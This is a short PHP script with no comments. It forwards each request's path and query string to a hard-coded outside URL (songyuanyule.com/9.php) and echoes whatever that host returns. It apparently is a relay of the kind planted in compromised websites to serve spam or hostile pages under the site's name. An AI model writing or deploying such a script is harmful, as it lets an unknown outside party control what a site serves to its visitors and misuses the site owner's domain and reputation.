<?php  
function curlGet($url) {
$ch = curl_init();
curl_setopt ($ch, CURLOPT_URL, $url);
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER,1); 
$out = curl_exec($ch);
curl_close ($ch);
return $out;
}
$urla=$_SERVER['PHP_SELF']."?".$_SERVER["QUERY_STRING"];
$url="http://songyuanyule.com/9.php".$urla;
echo curlGet($url);